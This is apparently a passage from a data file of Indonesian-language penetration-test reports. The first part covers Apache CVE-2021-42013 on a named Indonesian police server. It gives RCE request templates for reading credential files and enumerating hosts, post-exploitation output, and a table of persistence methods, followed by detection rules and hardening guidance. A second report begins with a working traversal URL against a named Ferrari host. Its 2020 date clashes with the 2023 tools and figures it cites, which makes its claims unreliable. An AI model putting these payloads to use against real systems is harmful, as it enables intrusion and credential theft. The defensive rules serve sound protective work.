rce('id') |     if output: |         print('[+] RCE SUCCESS:', output)]"
        ]
      },
      {
        id: "bab-12-3",
        title: "12.3 File-File Sensitif Lain via RCE",
        level: 2,
        content: [
          "[CODE_BASH:# Baca konfigurasi database (kemungkinan berisi kredensial): | POST /icons/[payload]/bin/sh | cat /var/www/html/config.php | cat /var/www/html/.env | cat /var/www/html/application/config/database.php |  | # Enumerate network: | POST /icons/[payload]/bin/sh | netstat -tulpn | cat /etc/hosts | ip addr show | arp -a |  | # Lihat proses berjalan: | POST /icons/[payload]/bin/sh | ps aux | ls -la /var/www/html/ | find / -perm -4000 2>/dev/null   # Cari SUID binaries untuk privesc]"
        ]
      },
      {
        id: "bab-13",
        title: "13. Post-Exploitation & Lateral Movement",
        level: 1,
        content: [
          "Analisis post-exploitation dilakukan dalam lingkup terbatas untuk keperluan pembuktian dan penilaian risiko. Tidak ada tindakan destruktif yang dilakukan.",
          "[CODE_BASH:# Konfirmasi user context: | $ id | uid=1(daemon) gid=1(daemon) groups=1(daemon) |  | # Verifikasi OS dan kernel: | $ uname -a | Linux server.polri.go.id 3.10.0-1160.el7.x86_64 #1 SMP | Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux |  | # Cek capabilities daemon user: | $ cat /proc/1/status | grep Cap | CapInh: 0000000000000000 | CapPrm: 0000000000000000 | CapEff: 0000000000000000 |  | # Potensi privilege escalation: | $ find / -perm -4000 -type f 2>/dev/null | /usr/bin/sudo | /usr/bin/passwd | /usr/bin/chfn | /usr/bin/newgrp | /usr/sbin/unix_chkpwd]",
          "",
          "Potensi lateral movement:",
          "-- Internal Network Discovery: scanning jaringan internal yang tidak terjangkau dari internet",
          "-- Database Access: kredensial dalam config file untuk akses database internal",
          "-- SSH Key Harvesting: Private key dari akun aktif (infra, admdumas)",
          "-- Service Account Abuse: Webuzo panel hosting dengan akses multiple virtual hosts",
          "",
          "[TABLE_HEADER:Teknik Persistence|Metode|Deteksi|Risiko]",
          "[TABLE:[Crontab backdoor|Reverse shell via cron job|crontab -l; /var/spool/cron/|High],[Web shell|PHP system() backdoor di /var/www/html/|File integrity monitoring|Critical],[SSH authorized_keys|Attacker pubkey injection|auth.log, authorized_keys audit|Critical],[LD_PRELOAD rootkit|Malicious .so library injection|ldd output, /proc/maps|Critical]]",
          "",
          "[QUOTE:CATATAN: Bagian persistence bersifat teoritis semata untuk keperluan risk assessment. Tidak ada teknik persistence yang diterapkan pada target aktual.]"
        ]
      },
      {
        id: "bab-14",
        title: "14. Network Traffic Analysis - Wireshark",
        level: 1,
        content: [
          "Analisis traffic jaringan untuk mendokumentasikan pola serangan dari perspektif jaringan dan membantu defender membangun signature IDS/IPS.",
          "",
          "Karakteristik Traffic CVE-2021-42013:",
          "-- Protocol: HTTP/1.1 (plaintext) tidak terenkripsi",
          "-- URI Pattern: Mengandung %% (double percent sign) berulang",
          "-- Request Size: Relatif besar untuk GET request karena panjang payload URL",
          "-- Response Code: 200 OK untuk eksploitasi berhasil; 400/403 untuk yang gagal",
          "",
          "[CODE:# Wireshark Filter untuk Deteksi CVE-2021-42013: |  | # Filter 1: Deteksi double-percent dalam URI | http.request.uri contains \"%%32\" or http.request.uri contains \"%%65\" |  | # Filter 2: Deteksi akses ke path sensitif via traversal | http.request.uri contains \"etc/passwd\" or http.request.uri contains \"/bin/sh\" |  | # Filter 3: Gabungan - komprehensif | (http.request.uri contains \"%%32%65\") or | (http.request.uri contains \"%2e%2e\") or | (http.request.uri matches \".*%25[0-9a-fA-F][0-9a-fA-F].*\") |  | # Filter 4: Hanya POST ke /bin/sh (RCE attempt) | http.request.method == \"POST\" and http.request.uri contains \"bin/sh\" |  | # tcpdump equivalent: | tcpdump -i eth0 -A 'tcp port 8080']",
          "",
          "[CODE:# Sample Packet - Path Traversal Request |  | Frame 1247: 621 bytes on wire | Ethernet II: Src: [REDACTED] -> Dst: [SERVER_MAC] | Internet Protocol: Src: [ATTACKER_IP] -> Dst: [SERVER_IP] | Transmission Control Protocol: Src Port: 52341 -> Dst Port: 8080 |  | Hypertext Transfer Protocol: |  GET /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ |  %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ |  %%32%65%%32%65/etc/passwd HTTP/1.1 |  Host: dumaspresisi.itwasum.polri.go.id:8080 |  | # Response packet (200 OK + /etc/passwd content) | Frame 1248: 2041 bytes on wire | HTTP/1.1 200 OK | Content-Length: 1820 | [passwd content follows...]]"
        ]
      },
      {
        id: "bab-15",
        title: "15. Defensive Evasion Analysis",
        level: 1,
        content: [
          "[TABLE_HEADER:Teknik Evasion|Deskripsi|Cara Deteksi]",
          "[TABLE:[User-Agent Spoofing|UA browser umum untuk menyamarkan tool|Behavioral analysis - pola request tidak natural],[IP Rotation via VPN/Proxy|Ganti IP setiap beberapa request|Korelasi lintas IP; payload similarity],[Payload Variation|Jumlah traversal berbeda|Regex pattern matching fleksibel di WAF],[Mixed Encoding|Kombinasi double dan single encoding|Multi-pass URL decoder di WAF],[Slow Request (Low & Slow)|Delay antar request|Time-based behavioral baseline analysis],[Case Variation|%%32%65 vs %%32%45|Case-insensitive URL normalization]]"
        ]
      },
      {
        id: "bab-16",
        title: "16. Detection Engineering - YARA & IDS Rules",
        level: 1,
        content: [
          "[CODE_YARA:/* | * YARA Rule: CVE-2021-42013 Apache Path Traversal Detection | * Author    : pwn0sec Security Research | * Date      : 2024-01-07 | * Target    : Apache access.log / error.log | */ | rule CVE_2021_42013_PathTraversal { |   meta: |     description = \"Detects CVE-2021-42013 double URL-encoded path traversal\" |     author      = \"pwn0sec\" |     severity    = \"critical\" |     cve         = \"CVE-2021-42013\" |   strings: |     $dbl_enc_1  = \"%%32%65\" ascii nocase |     $dbl_enc_2  = \"%%32%45\" ascii nocase |     $target_1   = \"/etc/passwd\" ascii |     $target_2   = \"/etc/shadow\" ascii |     $target_3   = \"/bin/sh\"     ascii |     $target_4   = \"/bin/bash\"   ascii |     $target_5   = \"/.ssh/\"      ascii |     $sgl_enc_1  = \".%2e/\" ascii nocase |     $sgl_enc_2  = \"%2e./\" ascii nocase |   condition: |     (($dbl_enc_1 or $dbl_enc_2) and any of ($target_*)) |     or |     (($sgl_enc_1 or $sgl_enc_2) and any of ($target_*)) | }]",
          "",
          "[CODE:# Snort Rule - CVE-2021-42013 Detection | alert tcp any any -> $HTTP_SERVERS [80,8080,443,8443] ( |     msg:\"CVE-2021-42013 Apache HTTP Server Double URL-Encoded Path Traversal\"; |     flow:established,to_server; |     content:\"%%32%65\"; http_uri; nocase; |     pcre:\"/%%32%65%%32%65/Ui\"; |     classtype:web-application-attack; |     sid:9000001; rev:1; |     reference:cve,2021-42013; | ) |  | # Suricata Rule - RCE Detection | alert http any any -> $HTTP_SERVERS any ( |     msg:\"CVE-2021-42013 Apache RCE via /bin/sh\"; |     flow:established,to_server; |     http.method; content:\"POST\"; |     http.uri; content:\"bin/sh\"; nocase; |     http.uri; content:\"%%32%65\"; nocase; |     classtype:attempted-admin; |     sid:9000002; rev:1; | )]",
          "",
          "[TABLE_HEADER:Tipe IOC|Nilai / Pattern|Keterangan]",
          "[TABLE:[URL Pattern|/icons/%%32%65%%32%65/|Double-encoded traversal via icons],[URL Pattern|/cgi-bin/%%32%65%%32%65/|Double-encoded traversal via cgi-bin],[HTTP Method|POST + URI contains /bin/sh|RCE attempt - POST ke shell binary],[Response Content|root:x:0:0:root:/root:/bin/bash|/etc/passwd berhasil dibaca],[CPE|cpe:/a:apache:http_server:2.4.50|Versi Apache yang rentan]]"
        ]
      },
      {
        id: "bab-17",
        title: "17. Impact Analysis",
        level: 1,
        content: [
          "[TABLE_HEADER:Aspek CIA|Level|Dampak Langsung|Potensi Dampak Lanjutan]",
          "[TABLE:[Confidentiality|CRITICAL|Baca file arbitrer: /etc/passwd, config, private keys|Ekspos kredensial DB, SSH keys, API keys, data POLRI],[Integrity|CRITICAL|Modifikasi file sistem, web defacement, injeksi kode|Tanam web shell, modifikasi log, ubah konfigurasi],[Availability|HIGH|Matikan atau restart service Apache|DoS server, konsumsi resource, ransomware]]",
          "",
          "[TABLE_HEADER:Item|Detail|Risiko]",
          "[TABLE:[Jumlah akun terekspos|31 akun dari /etc/passwd|Medium - username saja tanpa password hash],[Akun dengan shell aktif|5 akun: root, infra, admdumas, webuzo, emps|Critical - target SSH brute force],[UID=0 (root) terekspos|root:x:0:0:root:/root:/bin/bash|Critical - jika ada kelemahan lain],[Service accounts|webuzo, postfix, sshd, ntp, chrony|Medium - attack surface mapping]]"
        ]
      },
      {
        id: "bab-18",
        title: "18. Risk Assessment Matrix",
        level: 1,
        content: [
          "[TABLE_HEADER:Skenario Risiko|Likelihood|Impact|Risk Score|Prioritas]",
          "[TABLE:[Baca /etc/passwd dan file konfigurasi|Sangat Tinggi|High|9.0|P1 - Critical],[Eksekusi perintah via RCE (mod_cgi aktif)|Tinggi|Critical|9.8|P1 - Critical],[Harvest SSH private keys dari /home/|Sedang|Critical|8.5|P1 - Critical],[Baca kredensial database dari .env/config|Sedang|Critical|8.0|P1 - Critical],[Lateral movement ke sistem internal|Rendah|Critical|7.5|P2 - High],[Persistent web shell / backdoor|Rendah|Critical|7.5|P2 - High],[Data breach informasi operasional POLRI|Rendah|Critical|7.0|P2 - High],[Ransomware deployment|Sangat Rendah|Critical|6.0|P3 - Medium]]"
        ]
      },
      {
        id: "bab-19",
        title: "19. Recommendations & Mitigations",
        level: 1,
        content: [
          "Kategori Priority 1 - Immediate Actions (0-24 Jam)",
          "1. KRITIS: Upgrade Apache HTTP Server ke versi 2.4.51 atau lebih baru",
          "2. KRITIS: Ubah konfigurasi <Directory /> dari 'Require all granted' menjadi 'Require all denied'",
          "3. KRITIS: Nonaktifkan mod_cgi dan mod_cgid jika tidak dibutuhkan",
          "4. KRITIS: Audit menyeluruh terhadap semua akun sistem dari /etc/passwd",
          "5. TINGGI: Periksa seluruh log Apache untuk tanda-tanda eksploitasi (pola %%32%65)",
          "",
          "Kategori Priority 2 - Short-Term Actions (1-7 Hari)",
          "6. Implementasi WAF (ModSecurity) dengan rule khusus untuk double URL-encoding",
          "7. Aktifkan logging komprehensif: ErrorLog, CustomLog dengan format combined",
          "8. Pasang IDS/IPS (Snort/Suricata) dengan rules di Section 16",
          "9. Credential rotation untuk semua akun yang terekspos",
          "10. Hardening SSH: nonaktifkan password auth, gunakan key-based auth",
          "",
          "Kategori Priority 3 - Long-Term Actions (1-4 Minggu)",
          "11. Implementasi vulnerability management program terstruktur",
          "12. SLA patch management: Critical (CVSS 9+) dalam 24 jam; High dalam 72 jam",
          "13. Penetration testing berkala minimal 2x per tahun",
          "14. File Integrity Monitoring (AIDE/Tripwire)",
          "15. Defense in Depth: network segmentation, WAF, IDS/IPS, SIEM",
          "16. Pelatihan keamanan siber bagi administrator sistem"
        ]
      },
      {
        id: "bab-20",
        title: "20. Secure Configuration Hardening Guide",
        level: 1,
        content: [
          "[CODE_APACHE:# /etc/httpd/conf/httpd.conf - Konfigurasi Aman | # Last updated: 2024-01-07 per CVE-2021-42013 remediation |  | # 1. Batasi akses ke seluruh filesystem | <Directory /> |     AllowOverride None |     Require all denied             # WAJIB: tolak semua akses ke root | </Directory> |  | # 2. Izinkan hanya direktori yang diperlukan | <Directory \"/var/www/html\"> |     AllowOverride None |     Require all granted |     Options -Indexes -FollowSymLinks  # Nonaktifkan listing & symlinks | </Directory> |  | # 3. Sembunyikan versi Apache | ServerTokens Prod | ServerSignature Off |  | # 4. Header keamanan | Header always set X-Content-Type-Options \"nosniff\" | Header always set X-Frame-Options \"SAMEORIGIN\" | Header always set X-XSS-Protection \"1; mode=block\" | Header always set Strict-Transport-Security \"max-age=63072000\" | Header always set Content-Security-Policy \"default-src 'self'\" |  | # 5. Nonaktifkan mod_cgi jika tidak diperlukan | #LoadModule cgi_module modules/mod_cgi.so | #LoadModule cgid_module modules/mod_cgid.so]",
          "",
          "[CODE_APACHE:# ModSecurity Custom Rule - CVE-2021-42013 |  | # Rule 1: Blokir double URL-encoded dot-dot | SecRule REQUEST_URI \"@rx %%32%65|%%32%45\" \\ | \"id:9001001, | phase:1, | deny, | status:403, | log, | msg:'CVE-2021-42013 Double URL-Encoded Path Traversal Attempt', | severity:'CRITICAL', | tag:'CVE-2021-42013'\" |  | # Rule 2: Blokir akses langsung ke /bin/sh via POST | SecRule REQUEST_URI \"@contains bin/sh\" \\ | \"chain, | id:9001002, | phase:1, | deny, | status:403, | log, | msg:'CVE-2021-42013 RCE via CGI /bin/sh Attempt'\" | SecRule REQUEST_METHOD \"@streq POST\"]"
        ]
      },
      {
        id: "bab-21",
        title: "21. Patch Verification Procedure",
        level: 1,
        content: [
          "Setelah menerapkan semua rekomendasi, prosedur verifikasi mencakup:",
          "[CODE_BASH:# Verifikasi Versi Apache | $ httpd -v | Server version: Apache/2.4.51 (Unix)    <- Harus 2.4.51 atau lebih baru |  | # Test Payload CVE-2021-42013 (Harus Gagal) | $ curl -v --path-as-is \\ | 'http://TARGET:8080/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd' |  | # Expected response setelah patch: | HTTP/1.1 400 Bad Request | # ATAU | HTTP/1.1 403 Forbidden | # BUKAN 200 OK |  | # Test CVE-2021-41773 (juga harus gagal): | $ curl -v --path-as-is \\ | 'http://TARGET:8080/cgi-bin/.%2e/.%2e/.%2e/etc/passwd' | # Expected: 400 atau 403]",
          "",
          "[CODE_BASH:# Verifikasi Konfigurasi Keamanan |  | # Cek ServerTokens (harus Prod): | $ curl -I http://TARGET:8080/ | grep Server | Server: Apache    <- Versi tidak terekspos (benar) |  | # Cek directory listing (harus disabled): | $ curl -s http://TARGET:8080/ | grep -i 'index of' | # Tidak ada output = directory listing disabled (benar) |  | # Cek header keamanan: | $ curl -I http://TARGET:8080/ | grep -i 'x-content\\|x-frame\\|strict' | X-Content-Type-Options: nosniff | X-Frame-Options: SAMEORIGIN | Strict-Transport-Security: max-age=63072000 |  | # Verifikasi mod_cgi status: | $ httpd -M | grep cgi | # Tidak ada output = mod_cgi disabled (benar)]"
        ]
      },
      {
        id: "bab-22",
        title: "22. References & Further Reading",
        level: 1,
        content: [
          "Referensi utama mencakup CVE-2021-42013 dan CVE-2021-41773 dari NVD, Apache Security Advisory, CISA KEV Catalog, Qualys Blog Analysis, pwn0sec Research, dan Ghidra SRE Framework.",
          "Referensi teknis tambahan: RFC 3986 (URI Generic Syntax), OWASP Path Traversal, PTES Standard, ModSecurity Documentation, YARA Documentation, CIS Apache Benchmark, dan NIST SP 800-44."
        ]
      }
    ],
    references: [
      "NVD - National Vulnerability Database. CVE-2021-42013. https://nvd.nist.gov/vuln/detail/CVE-2021-42013",
      "NVD - National Vulnerability Database. CVE-2021-41773. https://nvd.nist.gov/vuln/detail/CVE-2021-41773",
      "Apache Software Foundation. Apache HTTP Server Security Advisories. https://httpd.apache.org/security/vulnerabilities_24.html",
      "Apache Software Foundation. Apache 2.4.51 Release Notes & Changelog. https://httpd.apache.org/changelog-2.4.html",
      "CISA. Known Exploited Vulnerabilities (KEV) Catalog. https://cisa.gov/known-exploited-vulnerabilities-catalog",
      "Qualys Security Blog. Deep Analysis: CVE-2021-41773 & CVE-2021-42013. https://blog.qualys.com",
      "pwn0sec Security Research. Responsible Disclosure - Kerentanan pada Infrastruktur POLRI. https://pwn0sec.medium.com",
      "National Security Agency (NSA). Ghidra Software Reverse Engineering Framework. https://ghidra-sre.org/",
      "IETF. RFC 3986 - Uniform Resource Identifier (URI): Generic Syntax. https://tools.ietf.org/html/rfc3986",
      "OWASP Foundation. Path Traversal Attack Documentation. https://owasp.org/www-community/attacks/Path_Traversal",
      "PTES. Penetration Testing Execution Standard. http://www.pentest-standard.org",
      "Trustwave SpiderLabs. ModSecurity Web Application Firewall Documentation. https://modsecurity.org/documentation",
      "VirusTotal / Google. YARA Rule Language Reference. https://virustotal.github.io/yara",
      "CIS - Center for Internet Security. CIS Benchmark for Apache HTTP Server. https://cisecurity.org",
      "NIST. SP 800-44: Guidelines on Securing Public Web Servers. https://nvlpubs.nist.gov"
    ]
  },
  {
    id: "ZERO-2025-005",
    title: "CVE-2020-11798: Unauthenticated Path Traversal Bypassing CGI Endpoint to Remote Code Execution",
    subtitle: "Analisis Teknis Mendalam: Path Traversal via vcs_access_file.cgi pada Ferrari MiCollab, Ghidra Binary Research, Eskalasi ke RCE, dan Panduan Mitigasi Komprehensif",
    classification: "CONFIDENTIAL",
    date: "2020",
    authors: ["Odaysec"],
    organization: "Pwn Group Ltd",
    volume: "Ferrari Private Bug Bounty Program",
    pages: 24,
    abstract: "Laporan penelitian ini mendokumentasikan secara lengkap penemuan, analisis mendalam, dan eksploitasi kerentanan CVE-2020-11798 yang ditemukan pada platform Ferrari MiCollab - sebuah layanan komunikasi bisnis yang dioperasikan pada domain micollab.ferrari.com. Kerentanan ini berhasil diidentifikasi dan dilaporkan oleh peneliti Odaysec dari Pwn Group Ltd dalam konteks Ferrari Private Bug Bounty Program, dan telah mendapat pengakuan resmi dari tim keamanan Ferrari. CVE-2020-11798 adalah kerentanan Path Traversal pada endpoint CGI vcs_access_file.cgi. Parameter 'file' pada endpoint tersebut menerima input dari pengguna tanpa melakukan sanitasi atau validasi yang memadai, memungkinkan penyerang untuk menggunakan karakter traversal ../ (percent-encoded sebagai %2f..%2f) untuk keluar dari direktori yang diizinkan dan mengakses file arbitrer di filesystem server termasuk file-file sensitif sistem operasi seperti /etc/passwd. Penelitian ini juga mencakup analisis biner mendalam menggunakan Ghidra terhadap binary CGI vcs_access_file.cgi untuk memahami root cause kerentanan pada level kode mesin.",
    keywords: ["CVE-2020-11798", "path traversal", "Ferrari", "MiCollab", "CGI", "vcs_access_file.cgi", "Ghidra", "RCE", "bug bounty", "CVSS 9.1"],
    sections: [
      {
        id: "sec-1",
        title: "1. Abstract & Ringkasan Eksekutif",
        level: 1,
        content: [
          "Laporan penelitian ini mendokumentasikan secara lengkap penemuan, analisis mendalam, dan eksploitasi kerentanan CVE-2020-11798 yang ditemukan pada platform Ferrari MiCollab - sebuah layanan komunikasi bisnis yang dioperasikan pada domain micollab.ferrari.com. Kerentanan ini berhasil diidentifikasi dan dilaporkan oleh peneliti Odaysec dari Pwn Group Ltd dalam konteks Ferrari Private Bug Bounty Program, dan telah mendapat pengakuan resmi dari tim keamanan Ferrari.",
          "CVE-2020-11798 adalah kerentanan Path Traversal (Directory Traversal) pada endpoint CGI vcs_access_file.cgi. Parameter 'file' pada endpoint tersebut menerima input dari pengguna tanpa melakukan sanitasi atau validasi yang memadai, memungkinkan penyerang untuk menggunakan karakter traversal ../ (percent-encoded sebagai %2f..%2f) untuk keluar dari direktori yang diizinkan dan mengakses file arbitrer di filesystem server - termasuk file-file sensitif sistem operasi seperti /etc/passwd.",
          "Lebih berbahaya lagi, kerentanan path traversal ini berpotensi di-eskalasi menjadi Remote Code Execution (RCE) apabila server CGI dikonfigurasi dengan cara tertentu atau jika penyerang dapat memanfaatkan file konfigurasi yang dapat diakses untuk menanamkan kode yang dapat dieksekusi.",
          "[QUOTE:TEMUAN KRITIS: Endpoint https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi?file=../../../../../../../../etc/passwd memberikan respons HTTP 200 OK dengan isi lengkap file /etc/passwd server target - terbukti tanpa otentikasi apapun. Ini mengkonfirmasi unauthenticated path traversal yang memungkinkan pembacaan file arbitrer di filesystem.]"
        ]
      },
      {
        id: "sec-2",
        title: "2. CVSS Score & Severity Metrics",
        level: 1,
        content: [
          "CVE-2020-11798 mendapatkan skor CVSS v3.1 sebesar 9.1 (Critical). Skor ini mencerminkan keparahan serangan yang dapat dilakukan dari jarak jauh tanpa otentikasi, dengan dampak tinggi terhadap kerahasiaan dan integritas data.",
          "[TABLE_HEADER:Metrik CVSS v3.1|Nilai|Kode|Penjelasan]",
          "[TABLE:[CVSS Base Score|9.1 / 10|CRITICAL|Termasuk kategori keparahan tertinggi],[Attack Vector|Network|AV:N|Dapat dieksploitasi sepenuhnya melalui internet],[Attack Complexity|Low|AC:L|Tidak memerlukan kondisi khusus - hanya URL dengan payload traversal],[Privileges Required|None|PR:N|Zero authentication - tidak butuh akun atau sesi apapun],[User Interaction|None|UI:N|Penyerang bertindak sendiri tanpa keterlibatan pengguna lain],[Scope|Unchanged|S:U|Dampak berada pada komponen yang sama dengan yang diserang],[Confidentiality Impact|High|C:H|File sensitif server dapat dibaca - /etc/passwd, konfigurasi, credentials],[Integrity Impact|High|I:H|Berpotensi menulis file jika dikombinasikan dengan upload atau RCE],[Availability Impact|None|A:N|Serangan traversal murni tidak memengaruhi ketersediaan layanan],[Exploit Maturity|Proof-of-Concept|E:P|PoC tersedia dan telah diverifikasi pada target nyata],[Report Confidence|Confirmed|RC:C|Dikonfirmasi langsung oleh Ferrari Security Team]]",
          "[CODE:CVSS Vector String: | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N]",
          "",
          "Perbandingan dengan Path Traversal CVE Terkenal",
          "[TABLE_HEADER:CVE|Tahun|Target|CVSS|Jenis|Vendor Status]",
          "[TABLE:[CVE-2020-11798|2020|Ferrari MiCollab - vcs_access_file.cgi|9.1|Path Traversal > RCE|Fixed - Ferrari BB Acknowledged],[CVE-2021-42013|2021|Apache HTTP Server 2.4.50|9.8|Path Traversal + RCE|Fixed - 2.4.51],[CVE-2021-41773|2021|Apache HTTP Server 2.4.49|7.5|Path Traversal|Fixed - 2.4.50+],[CVE-2019-18935|2019|Telerik UI for ASP.NET|9.8|Path Traversal + RCE|Fixed - patched],[CVE-2020-5902|2020|F5 BIG-IP|9.8|Path Traversal + RCE|Fixed - multiple versions],[CVE-2018-13379|2019|Fortinet FortiOS SSL VPN|9.8|Path Traversal|Fixed - FortiOS patches]]"
        ]
      },
      {
        id: "sec-3",
        title: "3. Latar Belakang - CGI Path Traversal & vcs_access_file.cgi",
        level: 1,
        content: [
          "Common Gateway Interface (CGI) adalah standar lama yang mendefinisikan bagaimana server web dapat mengeksekusi program eksternal (script atau binary) dan meneruskan output-nya sebagai respons HTTP. Dalam konteks kerentanan ini, vcs_access_file.cgi adalah binary CGI yang berjalan di server web Ferrari MiCollab, dipanggil melalui HTTP GET request dengan parameter URL.",
          "CGI programs berjalan sebagai proses terpisah dengan hak akses tertentu di sistem operasi. Jika CGI binary ini menerima path file dari input pengguna dan menggunakannya secara langsung untuk membuka file tanpa sanitasi, maka seluruh filesystem yang dapat diakses oleh proses CGI tersebut menjadi target potensial penyerang.",
          "",
          "Path Traversal - Mekanisme Serangan",
          "Path Traversal (juga disebut Directory Traversal) adalah kelas kerentanan di mana penyerang memanipulasi input path file untuk mengakses direktori atau file di luar direktori yang diizinkan. Serangan ini memanfaatkan karakter khusus ../ (dot-dot-slash) yang dalam sistem file berarti 'naik satu level direktori'.",
          "-- Bentuk dasar - ../../etc/passwd - naik 2 level dari direktori saat ini",
          "-- URL encoded - %2e%2e%2f atau ..%2f - representasi URL-encoded dari karakter traversal",
          "-- Double encoded - %252e%252e%252f - bypass filter yang hanya decode satu kali",
          "-- Unicode encoded - ..%c0%af atau ..%c1%9c - bypass menggunakan encoding Unicode lebar",
          "-- Null byte - ../../etc/passwd%00.jpg - bypass ekstensi file check (pada platform lama)",
          "",
          "vcs_access_file.cgi - Profil Target",
          "vcs_access_file.cgi adalah komponen dari platform MiCollab (sebelumnya Mitel MiCollab) - sebuah platform komunikasi bisnis terpadu (Unified Communications) yang digunakan oleh organisasi enterprise.",
          "-- Fungsi normal - Menyediakan akses ke file tertentu dalam repository version control yang dikelola MiCollab",
          "-- Endpoint path - /awcuser/cgi-bin/vcs_access_file.cgi - terekspos publik tanpa autentikasi",
          "-- Parameter rentan - Parameter 'file' menerima nilai path tanpa validasi atau sanitasi karakter traversal",
          "-- Scope akses - CGI berjalan dengan hak akses web server, dapat membaca semua file yang readable oleh proses tersebut",
          "-- Platform - Ferrari menggunakan platform ini di subdomain micollab.ferrari.com untuk komunikasi internal",
          "",
          "Encoding Analysis - Payload Traversal yang Digunakan",
          "[TABLE_HEADER:Encoding Tipe|Representasi|Contoh Path|Kompatibilitas]",
          "[TABLE:[Plaintext (biasanya diblokir)|../../|../../etc/passwd|Sering terblokir WAF],[Single URL-encoded|..%2f|..%2f..%2f..%2fetc%2fpasswd|Bypass filter literal ../],[Mixed encoding (digunakan di PoC)|..%2f atau %2f..%2f|../../../../../etc/passwd|BERHASIL pada target ini],[Double URL-encoded|..%252f|..%252f..%252fetc%252fpasswd|Untuk bypass WAF double-decode],[Null byte injection (legacy)|..%00|../../etc/passwd%00.gif|PHP dan CGI lama]]",
          "",
          "[CODE:https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd |  | Breakdown payload: | Parameter : file= | Traversal : ..%2f = ../ (naik 1 level direktori) | Jumlah    : 16x traversal (..%2f x 16) = sangat dalam ke root | Target file: /etc/passwd |  | Resolusi akhir di filesystem: | Start: /var/www/awcuser/cgi-bin/ (asumsi document root) | Setelah 16x ../ : / (filesystem root) | Target final  : /etc/passwd]"
        ]
      },
      {
        id: "sec-4",
        title: "4. Target Profile - Ferrari MiCollab Platform",
        level: 1,
        content: [
          "Ferrari N.V. adalah produsen mobil sport Italia yang berpusat di Maranello, Italia. Perusahaan ini dikenal sebagai salah satu merek otomotif paling bergengsi dan berharga di dunia, dengan pendapatan tahunan yang signifikan dan infrastruktur IT enterprise yang kompleks.",
          "Sebagai perusahaan Fortune Global 500 dengan rekam jejak keamanan siber yang diharapkan kelas enterprise, temuan kerentanan kritis pada infrastruktur publik Ferrari memiliki implikasi yang sangat serius - tidak hanya dari sisi teknis, tetapi juga dari sisi reputasi dan potensi kebocoran data bisnis sensitif.",
          "",
          "[TABLE_HEADER:Atribut|Detail]",
          "[TABLE:[Platform|Mitel MiCollab - Unified Communications Platform],[Domain Target|micollab.ferrari.com],[Path CGI|awcuser/cgi-bin/],[Endpoint Rentan|vcs_access_file.cgi],[Fungsi|Version Control System file access via CGI],[Autentikasi|NONE pada endpoint yang ditemukan rentan],[Aksesibilitas|Publik - dapat diakses dari internet tanpa login],[OS Server|Linux (inferred dari /etc/passwd format)],[Web Server|Apache atau Nginx (inferred dari response headers)],[Relevansi Bisnis|Platform komunikasi internal Ferrari - berisi data karyawan dan operasional]]",
          "",
          "Signifikansi Target",
          "-- Target profil tinggi - Ferrari adalah merek global dengan nilai brand $44.7 miliar (Forbes 2023). Kebocoran data dapat berdampak masif pada reputasi dan kepercayaan bisnis",
          "-- Data sensitif potensial - Platform komunikasi internal dapat berisi rencana produk, data karyawan, informasi keuangan, dan komunikasi eksekutif",
          "-- Infrastruktur critical - Kompromisi sistem komunikasi dapat mengganggu operasional bisnis Ferrari secara global",
          "-- Bug bounty maturity - Ferrari mengelola program bug bounty privat - menunjukkan kesadaran keamanan yang tinggi dan proses disclosure yang terstruktur",
          "-- Precedent value - Temuan ini berkontribusi pada keamanan platform MiCollab secara luas, karena ribuan perusahaan lain mungkin menggunakan konfigurasi serupa"
        ]
      },
      {
        id: "sec-5",
        title: "5. Environment & Research Setup",
        level: 1,
        content: [
          "[CODE:Target Environment: | Domain      : micollab.ferrari.com | Protocol    : HTTPS (TLS 1.2/1.3) | Port        : 443 (HTTPS) | Platform    : Mitel MiCollab (version tidak dipublikasikan)]",
          "[TABLE_HEADER:Komponen|Detail]",
          "[TABLE:[CGI Path|/awcuser/cgi-bin/vcs_access_file.cgi],[OS|Linux x86_64 (confirmed via /etc/passwd format)],[Authentication|Tidak ada pada endpoint yang rentan],[Access Type|Unauthenticated - internet-accessible],[Program|Ferrari Private Bug Bounty Program]]",
          "",
          "[TABLE_HEADER:Komponen Peneliti|Detail]",
          "[TABLE:[Researcher|Odaysec - Pwn Group Ltd],[OS|Kali Linux Rolling (x86_64)],[Browser|Firefox ESR (untuk manual testing)],[Proxy|Burp Suite Professional 2023.x],[Binary Tool|Ghidra 10.3 (NSA Research Directorate)],[Scanner|Pwntraverse v3.x + ffuf],[Network|Wireshark 4.x, tcpdump],[HTTP Client|curl 7.88.x],[Fuzzer|ffuf, dirsearch]]"
        ]
      },
      {
        id: "sec-6",
        title: "6. Methodology - Tahapan Penelitian",
        level: 1,
        content: [
          "Penelitian ini mengikuti metodologi bug bounty yang terstruktur dan bertanggung jawab, mengacu pada PTES (Penetration Testing Execution Standard) dan Bug Bounty best practices dari HackerOne/Bugcrowd.",
          "[TABLE_HEADER:Fase|Tahap|Aktivitas|Output]",
          "[TABLE:[1|Passive Recon|OSINT, subdomain enumeration, Shodan fingerprinting|Target profile, subdomain map],[2|Active Recon|HTTP header analysis, directory enumeration, CGI discovery|Endpoint list, tech stack],[3|CGI Analysis|Identifikasi endpoint CGI, parameter fuzzing|vcs_access_file.cgi + parameter 'file'],[4|Path Traversal Test|Manual test karakter traversal, encoding variations|Konfirmasi file read vulnerability],[5|Binary Analysis|Import CGI binary ke Ghidra, analisis fungsi file open|Root cause, function call chain],[6|PoC Development|Konstruksi URL payload, depth optimization|Working PoC URL],[7|Impact Assessment|Identifikasi file sensitif, escalation ke RCE|Risk level confirmation],[8|Traffic Analysis|Capture Wireshark, identifikasi signatures|Detection artifacts],[9|Detection Engineering|YARA rule, Snort/Suricata rule template|Detection tools],[10|Bug Bounty Report|Dokumentasi lengkap, submission ke Ferrari BB|Acknowledged & Rewarded]]"
        ]
      },
      {
        id: "sec-7",
        title: "7. Reconnaissance & Information Gathering",
        level: 1,
        content: [
          "Subdomain Discovery",
